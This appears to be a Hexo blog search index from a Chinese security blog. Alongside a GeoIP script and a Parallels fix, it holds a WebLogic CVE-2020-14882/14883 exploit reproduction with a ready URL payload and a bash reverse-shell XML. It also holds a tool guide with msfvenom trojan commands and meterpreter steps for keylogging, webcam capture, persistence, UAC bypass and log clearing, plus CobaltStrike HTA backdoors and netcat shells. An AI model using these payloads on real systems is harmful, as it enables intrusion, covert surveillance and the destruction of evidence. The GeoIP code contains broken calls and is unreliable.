<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>在Windows10 wsl下以图形化运行Kali Linux</title>
      <link href="2020/12/30/%E5%9C%A8windows10-wsl%E4%B8%8B%E4%BB%A5%E5%9B%BE%E5%BD%A2%E5%8C%96%E8%BF%90%E8%A1%8Ckali-linux/"/>
      <url>2020/12/30/%E5%9C%A8windows10-wsl%E4%B8%8B%E4%BB%A5%E5%9B%BE%E5%BD%A2%E5%8C%96%E8%BF%90%E8%A1%8Ckali-linux/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql数据库学习笔记之数据库及SQLMySQL基础</title>
      <link href="2020/12/30/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8Asqlmysql%E5%9F%BA%E7%A1%80/"/>
      <url>2020/12/30/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8Asqlmysql%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用python获取ip地址归属地</title>
      <link href="2020/12/26/%E4%BD%BF%E7%94%A8python%E8%8E%B7%E5%8F%96ip%E5%9C%B0%E5%9D%80%E5%BD%92%E5%B1%9E%E5%9C%B0/"/>
      <url>2020/12/26/%E4%BD%BF%E7%94%A8python%E8%8E%B7%E5%8F%96ip%E5%9C%B0%E5%9D%80%E5%BD%92%E5%B1%9E%E5%9C%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ip地址归属"><a href="#ip地址归属" class="headerlink" title="ip地址归属"></a>ip地址归属</h1><p>使用geoip的ip地址库</p><pre class="line-numbers language-python__" data-language="python__"><code class="language-python__">import geoip2.databaseimport osclass Ip2Locate(object):    def __init__(self,ip):        self.ip = ip            @property        def locate(self):        databasesPath = os.path.join(os.path.abspath(os.path.dirpath(__file__)),'databases','GeoLite2-City.mmdb')# database path        reader = geoip2.database.Render(databasesPath)        try:            response = reader.city(self.ip)        except:            return        country_iso_code = response.country.iso_code # 国家缩写 eg: US        country = response.country.names['zh-CN'] # 国家（中文）eg: 美国        province = response.subdivisions.most_specific.names['zh-CN'] # 省份，州 （中文）eg: 明尼苏达州        province_iso_code = response.subdivisions.most_specific.iso_code #省份简写 eg: MN        city = response.city.names['zh-CN'] #城市名，（中文）eg: 明尼阿波利斯        latitude = response.location.latitude # 纬度        longitude = response.location.longitude # 经度        locate_info = {"country_iso_code":country_iso_code,                       "country":country,                       "province":province,                       "province_iso_code":province_iso_code,                       "city":city,                       "latitude":latitude,                       "longitude":longitude                        }        return locate_info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1488214883复现</title>
      <link href="2020/12/03/cve-2020-1488214883%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/12/03/cve-2020-1488214883%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><p><img src="https://www.ex1t.xyz/wp-content/uploads/2020/12/20200804075633719.gif"></p><h2 id="1、漏洞来源"><a href="#1、漏洞来源" class="headerlink" title="1、漏洞来源"></a>1、漏洞来源</h2><p><strong>Weblogic</strong></p><p>Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p><p><img src="http://img.ex1t.xyz/20201230173950.png"></p><p><strong>CVE-2020-14883: 权限绕过漏洞</strong></p><p>远程攻击者可以构造特殊的<code>HTTP</code>请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code></p><p><strong>CVE-2020-14882: 代码执行漏洞</strong></p><p>结合 <code>CVE-2020-14883</code> 漏洞，远程攻击者可以构造特殊的<code>HTTP</code>请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p><h2 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h2><pre class="line-numbers language-none"><code class="language-none">weblogic 10.3.6.0.0weblogic 12.1.3.0.0weblogic 12.2.1.3.0weblogic 12.2.1.4.0weblogic 14.1.1.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、环境搭建"><a href="#3、环境搭建" class="headerlink" title="3、环境搭建"></a>3、环境搭建</h2><p>（1）Linux</p><p>vulhub已经更新了这个环境 </p><pre class="line-numbers language-none"><code class="language-none">cd vulhub/weblogic/CVE-2020-14882/ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）win10</p><pre class="line-numbers language-none"><code class="language-none">链接：https://pan.baidu.com/s/1fCndQa1b1rahjrqGvLOybg 提取码：8888 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>由于时间原因，我只复现了linux环境部署</p><h2 id="4、漏洞利用"><a href="#4、漏洞利用" class="headerlink" title="4、漏洞利用"></a>4、漏洞利用</h2><h3 id="4-1、CVE-2020-14883：权限绕过"><a href="#4-1、CVE-2020-14883：权限绕过" class="headerlink" title="4.1、CVE-2020-14883：权限绕过"></a>4.1、<strong>CVE-2020-14883：权限绕过</strong></h3><p>通过以下路径越权进入控制台</p><pre class="line-numbers language-none"><code class="language-none">/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://img.ex1t.xyz/20201230174003.png"></p><h3 id="4-2、CVE-2020-14882-代码执行漏洞"><a href="#4-2、CVE-2020-14882-代码执行漏洞" class="headerlink" title="4.2、CVE-2020-14882: 代码执行漏洞"></a>4.2、CVE-2020-14882: 代码执行漏洞</h3><p><strong>1、命令执行</strong></p><p>/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27<strong>命令</strong>%27);%22);</p><p>创建文件</p><p>/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27<strong>touch /tmp/poc</strong>%27);%22);</p><p>前台显示404，后台已写入</p><p><img src="http://img.ex1t.xyz/20201230174016.png"></p><p><strong>2、加载执行远端xml文件</strong></p><p>通过FileSystemXmlApplicationContext()加载并执行远端xml文件：</p><p>/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(“<strong>地址</strong>“)</p><p><strong>Linux反弹shell</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;  &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;     &lt;constructor-arg&gt;         &lt;list&gt;           &lt;value&gt;/bin/bash&lt;/value&gt;           &lt;value&gt;-cc&lt;/value&gt;             &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1]]&gt;&lt;/value&gt;           &lt;/list&gt;         &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>win10打开计算器</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;  &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;     &lt;constructor-arg&gt;         &lt;list&gt;           &lt;value&gt;cmd&lt;/value&gt;           &lt;value&gt;/c&lt;/value&gt;             &lt;value&gt;&lt;![CDATA[calc]]&gt;&lt;/value&gt;           &lt;/list&gt;         &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>通过这个方法也可写入文件</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;  &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;     &lt;constructor-arg&gt;         &lt;list&gt;           &lt;value&gt;/bin/bash&lt;/value&gt;           &lt;value&gt;-cc&lt;/value&gt;             &lt;value&gt;&lt;![CDATA[echo '内容' &gt; 123.jsp]]&gt;&lt;/value&gt;           &lt;/list&gt;         &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试过写入一句话，连接失败。直接把木马复制进去也连接失败。</p><p>反弹shell不香吗，搞什么木马</p><h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><p>过一遍复现过程，记下笔记。那不是有手就行。</p><p>以上仅供学习交流，严禁用于违法途径</p><p><img src="http://img.ex1t.xyz/20201230174039.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KALI2020.4 安装pd tools 报错解决</title>
      <link href="2020/12/02/kali2020-4-%E5%AE%89%E8%A3%85pd-tools-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
      <url>2020/12/02/kali2020-4-%E5%AE%89%E8%A3%85pd-tools-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>不是翻译</p><ol><li> I managed to get Parallels Tools working today on my freshly updated Kali system by following the steps at <a href="https://kb.parallels.com/123968">https://kb.parallels.com/123968</a> but stopping before running ./install. Then follow the steps:</li><li>Move into the kmods directory, where you should see a file called prl_mod.tar.gz. Extract this archive so we can edit it.<br> 复制文件夹中所有文件到任意目录，进入kmos目录，解压prl_mod.tar.gz。</li><li>Open the file prl_fs/SharedFolders/Guest/Linux/prl_fs/inode.c and add the line “#define      segment_eq(a, b) ((a).seg == (b).seg)” to the top.<br> 打开文件<code>prl_fs/SharedFolders/Guest/Linux/prl_fs/inode.c</code>将内容<code>#define segment_eq(a, b) ((a).seg == (b).seg)"</code>放到文件开头</li><li>Open the file prl_fs_freeze/Snapshot/Guest/Linux/prl_freeze/prl_fs_freeze.c and add the line “#include &lt;linux/blkdev.h&gt;” to the top.<br>打开文件<code>prl_fs_freeze/Snapshot/Guest/Linux/prl_freeze/prl_fs_freeze.c</code>将内容<code>#include &lt;linux/blkdev.h&gt;</code>放在文件开头</li><li>Open the files prl_fs/SharedFolders/Guest/Linux/prl_fs/Makefile and prl_vid/Video/Guest/Linux/kmod/Makefile, and add the line “KBUILD_EXTRA_SYMBOLS := /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/Module.symvers” to the top.<br>编辑文件<code>prl_fs/SharedFolders/Guest/Linux/prl_fs/Makefile</code>和<code>prl_vid/Video/Guest/Linux/kmod/Makefile</code>，将内容<code>KBUILD_EXTRA_SYMBOLS := /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/Module.symvers</code>添加到文件头</li><li>Re-create the archive with the edited files.<br>使用kmods目录下命令创建压缩包<code>tar tar -zcvf prl_mod.tar.gz .</code></li><li>Now run ./install and it should work.<br>使用管理员运行./install应该可以运行</li></ol><p>PS: 亲测可用，如果按照失败，可以重启之后在安装一次</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几个渗透工具的简单使用</title>
      <link href="2020/09/14/%E5%87%A0%E4%B8%AA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>2020/09/14/%E5%87%A0%E4%B8%AA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><h2 id="1、Metasploit"><a href="#1、Metasploit" class="headerlink" title="1、Metasploit"></a>1、Metasploit</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><blockquote><p>一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程。</p></blockquote><h3 id="1-2-下载安装"><a href="#1-2-下载安装" class="headerlink" title="1.2  下载安装"></a>1.2  下载安装</h3><p>kali自带，非kali的linux安装命令</p><pre class="line-numbers language-none"><code class="language-none">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  ./msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可能有些久</p><h3 id="1-3-使用说明"><a href="#1-3-使用说明" class="headerlink" title="1.3 使用说明"></a>1.3 使用说明</h3><pre class="line-numbers language-none"><code class="language-none">进入框架：msfconsole使用search命令查找相关漏洞： search  ms17-010使用use进入模块:  use exploit/windows/smb/ms17_010_eternalblue   使用info查看模块信息： info 设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp查看模块需要配置的参数：show options设置参数：set  RHOST  192.168.125.138          set port   8888攻击：exploit或run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞利用exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。<br>Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码</p><h3 id="1-4-木马生成"><a href="#1-4-木马生成" class="headerlink" title="1.4  木马生成"></a>1.4  木马生成</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">windows msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip  -f -o shell.exe安卓app:msfvenom -p android/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 -o test2.apkLinux:msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 -f  elf <span class="token operator">&gt;</span> shell.elfMac:msfvenom -p osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 -f macho <span class="token operator">&gt;</span>  shell.machoPHP：msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f raw -o test.phpASP:msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f asp <span class="token operator">&gt;</span> shell.aspASPX：msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f  aspx <span class="token operator">&gt;</span> shell.aspxJSP:msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 -f  raw <span class="token operator">&gt;</span> shell.jspBash：msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f   raw <span class="token operator">&gt;</span> shell.shPerlmsfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f raw <span class="token operator">&gt;</span> shell.plpythonmsfvenom -p python/meterpreter/reverser_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f   raw <span class="token operator">&gt;</span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-5-实战"><a href="#1-5-实战" class="headerlink" title="1.5  实战"></a>1.5  实战</h3><p>生成恶意exe木马，在测试机上运行，在服务器进行反向连接</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LPORT=8888 LHOST=192.168.10.27  -f -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>原理是让测试机运行木马后 连接 控制机ip：端口</p><p>进入msf控制台，完成以下配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf <span class="token operator">&gt;</span> use exploit/multi/handler  <span class="token comment">#使用exploit/multi/handler监听从肉鸡发来的数据</span>msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp  <span class="token comment">#设置payload，不同的木马设置不同的payload</span>msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.10.27  <span class="token comment">#我们的主机ip</span>msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">8888</span>            <span class="token comment">#我们的主机端口</span>msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在测试机上运行木马</p><p><img src="http://img.ex1t.xyz/20201230174312.png"></p><p>连接成功</p><h3 id="1-6-后渗透"><a href="#1-6-后渗透" class="headerlink" title="1.6  后渗透"></a>1.6  后渗透</h3><p>连接成功后的一些操作</p><pre class="line-numbers language-none"><code class="language-none">run post/windows/gather/checkvm   判断是否是虚拟机蜜罐keyscan_start：开始键盘记录keyscan_dump：下载键盘记录keyscan_stop：结束键盘记录record_mic：录制声音（如果目标主机上有话筒的话）    -d ：记录的秒数，默认为1秒webcam_chat：查看摄像头接口webcam_list：查看摄像头列表webcam_stream：获取摄像头视频run vnc：开启远程桌面webcam_stream 开启摄像头webcam_snap 隐秘拍照功能 -i 1 或者2是开启前置摄像头和后置摄像头的uictl disable mouse  #禁用鼠标uictl disable keyboard  #禁用键盘uictl enable mouse  #开启鼠标getpid    # 获取当前进程的pidps   # 查看当前活跃进程migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt;   #杀死进程shell 进入cmdrun persistence -S - U -X -i 10 -r 控制机ip -p 控制机端口    持久后门Meterpreter使用background来保存当前会话到后台session查看后台会话 sessions 可以查看已经成功获取的会话 可以使用sessions -i 连接到指定序号的meterpreter会话已继续利用 shell命令 获取目标主机的远程命令行shell(cmd)提权use exploit/windows/local/bypassuac_eventvwr命令进入该模块设置session为你要使用的sessionclearev 清除日志跑路<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、CobaltStrike"><a href="#2、CobaltStrike" class="headerlink" title="2、CobaltStrike"></a>2、CobaltStrike</h2><h3 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1  简介"></a>2.1  简介</h3><p>是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><h3 id="2-2-下载安装"><a href="#2-2-下载安装" class="headerlink" title="2.2  下载安装"></a>2.2  下载安装</h3><pre class="line-numbers language-none"><code class="language-none">链接：https://pan.baidu.com/s/1ASUKsjtEr6roVdMVMmhUsg 提取码：8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先部署在linux服务器，默认使用的是50050端口,用户名是neo</p><pre class="line-numbers language-none"><code class="language-none">nohup ./teamserver 服务器ip 登陆密码 &gt;/dev/null 2&gt;&amp;1 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nobup是后台运行</p><p>然后客户端连接，windows运行start.bat</p><p><img src="http://img.ex1t.xyz/20201230174110.png"></p><p><strong>连接成功</strong></p><p><img src="http://img.ex1t.xyz/20201230174121.png"></p><h3 id="2-3-实战"><a href="#2-3-实战" class="headerlink" title="2.3 实战"></a>2.3 实战</h3><p><strong>首先建立Listener（监听器）</strong></p><p><strong>Cobait Strike-&gt;监听器-&gt;add</strong></p><p><img src="http://img.ex1t.xyz/20201230174137.png"></p><p><strong>分别是服务器ip，服务器ip，服务器端口</strong></p><p><strong>生成后门，介绍一种</strong></p><p><strong>攻击-&gt;生成后门-&gt;HTML Application</strong></p><p><img src="http://img.ex1t.xyz/20201230174156.png"></p><p>选择刚配置的监听器</p><p>然后保存文件</p><p>然后配置文件下载</p><p>攻击-&gt;钓鱼攻击-&gt;文件下载</p><p>选择你之前生成的木马文件。</p><p>会生成一个下载链接</p><p>测试机执行</p><pre class="line-numbers language-none"><code class="language-none">mshta http://ip:80/download/file1.ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或下载运行</p><p>已连接机器图，然后右击进行各类操作</p><p><img src="http://img.ex1t.xyz/20201230174209.png"></p><p>剩下的还是自己摸索这玩吧</p><h2 id="接下来说一下MSF和CS联动"><a href="#接下来说一下MSF和CS联动" class="headerlink" title="接下来说一下MSF和CS联动"></a>接下来说一下MSF和CS联动</h2><h3 id="1-1-MSF转移到CS"><a href="#1-1-MSF转移到CS" class="headerlink" title="1.1  MSF转移到CS"></a>1.1  MSF转移到CS</h3><p>简单方法进入cmd运行下</p><pre class="line-numbers language-none"><code class="language-none">mshta http://ip:80/download/file1.ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">复杂一点的use exploit/windows/local/payload_inject（选用exploit）set payload windows/x64/meterpreter/reverse_http（选用的payload一定要跟cs下监听的payload方式一样）set DisablePayloadHandler true（禁止产生一个新的handler）set LHOST IP（ip为cs监听会话用的ip）set LPORT 端口（端口为cs对应的接受反弹shell的端口）set pid 进程号（设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限）set session 1（设置需要派送的meterpreter）exploit（开始执行）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-CS转移到MSF"><a href="#1-2-CS转移到MSF" class="headerlink" title="1.2  CS转移到MSF"></a>1.2  CS转移到MSF</h3><p>msf配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_http（跟cs上选用的payload一样）<span class="token builtin class-name">set</span> lhost 本机ip <span class="token builtin class-name">set</span> lport 接受的端口 exploit 执行 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后cs上，右击测试机-&gt;增加会话</p><p>增加监听器，payload选择Foreign HTTP，然后配置</p><p><img src="http://img.ex1t.xyz/20201230174221.png"></p><p>然后选择这个监听器，就转移到msf上去了</p><h2 id="3、nc（Netcat-瑞士军刀）"><a href="#3、nc（Netcat-瑞士军刀）" class="headerlink" title="3、nc（Netcat/瑞士军刀）"></a>3、nc（Netcat/瑞士军刀）</h2><h3 id="1-1-简介-1"><a href="#1-1-简介-1" class="headerlink" title="1.1  简介"></a>1.1  简介</h3><p>可以读写TCP或UDP网络连接，，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。</p><p>nc端口扫描最主要的用途是，内网，我们的nmap工具是不能扫描到内网的，所以这时我们可以把nc上传到web服务器上，利用它来扫描内网主机。而由于nc体积很小，所以不容易被发现。</p><h3 id="1-2-下载安装-1"><a href="#1-2-下载安装-1" class="headerlink" title="1.2 下载安装"></a>1.2 下载安装</h3><p>这个自己网上下载吧，很容易找到</p><h3 id="1-3-使用说明-1"><a href="#1-3-使用说明-1" class="headerlink" title="1.3 使用说明"></a>1.3 使用说明</h3><pre class="line-numbers language-none"><code class="language-none">-l： 开启监听 ·-p：指定端口 ·-t： 以telnet形式应答 -e：程序重定向 -n：以数字形式表示ip -v：显示执行命令过程 -z :  不进行交互，直接显示结果 -u ：使用UDP协议传输 -w :  设置超时时间 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-4-功能实现"><a href="#1-4-功能实现" class="headerlink" title="1.4 功能实现"></a>1.4 功能实现</h3><h4 id="1-4-1-建立简单的聊天室"><a href="#1-4-1-建立简单的聊天室" class="headerlink" title="1.4.1  建立简单的聊天室"></a>1.4.1  建立简单的聊天室</h4><p>服务器端： nc   -lvp    8888     #监听8888端口   客户端： nc  -nv  ip  8888    #连接到服务器的8888端口 </p><p>然后双发输入,对方都能看得到</p><h4 id="1-4-2-传文件"><a href="#1-4-2-传文件" class="headerlink" title="1.4.2  传文件"></a>1.4.2  传文件</h4><pre class="line-numbers language-none"><code class="language-none">服务器端： nc  -lvp  8888 &lt; test.txt 客户端： nc -nv ip 8888 &gt; te<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>st.txt </p><h4 id="1-4-3-正向连接"><a href="#1-4-3-正向连接" class="headerlink" title="1.4.3  正向连接"></a>1.4.3  正向连接</h4><p>肉鸡开放8888端口作为cmd执行 </p><pre class="line-numbers language-none"><code class="language-none">nc -lvv -p 8888 -t -e cmd.exe <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们的主机访问肉鸡的8888 </p><pre class="line-numbers language-none"><code class="language-none">nc  -nvv  肉鸡ip  8888 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-4-4-反向连接"><a href="#1-4-4-反向连接" class="headerlink" title="1.4.4  反向连接"></a>1.4.4  反向连接</h4><p>我们的主机</p><pre class="line-numbers language-none"><code class="language-none">nc  -lvp  8888 nc  -t -e cmd.exe  控制机ip 8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 未完待续</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>   工具还有.了解大概功能和原理，以后需要的时候就能直接使用。等有空的时候再写一点。<br>   文章若存在问题，敬请指正。</p><p>以上仅供学习交流，严禁用于违法途径（手动狗头）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>等保测评之安全物理环境、安全管理</title>
      <link href="2020/08/27/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%E4%B9%8B%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E3%80%81%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/"/>
